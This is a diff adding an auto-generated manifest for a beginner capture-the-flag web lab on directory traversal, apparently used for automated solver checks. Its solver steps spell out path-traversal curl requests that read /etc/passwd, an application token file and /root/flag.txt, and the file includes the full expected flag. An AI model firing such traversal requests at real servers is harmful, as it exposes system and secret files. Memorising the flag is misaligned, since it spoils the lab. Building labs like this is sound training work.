@@ -1,0 +1,37 @@
+# Generated from platform/labs/Web/web-1-7-directory-traversal/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: web-1-7-directory-traversal
+track: Web
+difficulty: beginner
+source: platform/labs/Web/web-1-7-directory-traversal/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/web-1-7-directory-traversal.sh
+  steps:
+  - name: Web application responds
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/
+    expect: '200'
+  - name: Path traversal reads /etc/passwd
+    command: curl -s 'http://{target.webapp}/download?file=../../../etc/passwd' | grep -c root
+    expect: '1'
+  - name: Extract token 1 from application config
+    command: curl -s 'http://{target.webapp}/download?file=../config/token.conf' | grep -o 'token=[a-z0-9_]*' | sed 's/token=//'
+    expect: p4th
+  - name: Extract token 2 from /root/flag.txt
+    command: curl -s 'http://{target.webapp}/download?file=../../../root/flag.txt'
+    expect: tr4v3rs3d
+  - name: Verify complete flag
+    command: echo 'OCR{p4th_tr4v3rs3d}'
+    expect: OCR{p4th_tr4v3rs3d}
+expected_flag_count: 1
+expected_flag: OCR{p4th_tr4v3rs3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
